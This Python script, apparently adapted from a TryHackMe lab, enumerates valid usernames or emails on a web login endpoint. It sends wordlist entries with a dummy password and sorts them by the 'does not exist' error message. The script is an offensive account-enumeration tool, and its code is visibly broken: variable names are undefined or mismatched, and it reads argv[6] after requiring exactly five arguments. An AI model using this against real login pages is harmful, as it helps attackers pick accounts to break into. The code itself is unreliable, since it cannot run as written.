import requests
import sys

# initial script from https://tryhackme.com/r/room/enumerationbruteforce

def check_username_or_email(email, hostname, protocol, login_path, login_function_url):
    url = f"{login_function_url}"  # Location of the login function
    headers = {
        'Host': hostname,
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': f"{protocol}://{hostname}",
        'Connection': 'close',
        'Referer': login_path,
    }
    data = {
        'username': username_or_email,
        'password': 'password',  # Use a random password as we are only checking the username_or_email
        'function': 'login'
    }

    response = requests.post(url, headers=headers, data=data)
    return response.json()

def enumerate_username_or_emails(wordlist, login_page, login_function_url):
    valid_username_or_emails = []
    invalid_error = "username_or_email does not exist"  # Error message for invalid emails
    colon_split = login_page.split(':')
    fwdslash_split = login_page.split('/')
    protocol = colon_split[0]
    hostname = fwdslash_split[2]

    with open(username_or_email_file, 'r') as file:
        username_or_emails = file.readlines()

    for username_or_email in emails:
        username_or_email = email.strip()  # Remove any leading/trailing whitespace
        if username_or_email:
            response_json = check_username_or_email(email, hostname, protocol, login_page, login_function_url)
            if response_json['status'] == 'error' and invalid_error in response_json['message']:
                print(f"[INVALID] {username_or_email}")
            else:
                print(f"[VALID] {username_or_email}")
                valid_username_or_emails.append(email)

    return valid_username_or_emails

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python3 script.py -u <url_to_login_function_file_not_login_page> -U <url_to_login> -w <username_or_email_list_file>")
        sys.exit(1)

    
    login_function_file_url = sys.argv[2]
    login_page = sys.argv[4]
    wordlist = sys.argv[6]

    valid_username_or_emails = enumerate_username_or_emails(wordlist, login_page, login_function_file_url)

    print("\nValid username_or_emails found:")
    for valid_username_or_email in valid_emails:
        print(valid_username_or_email)

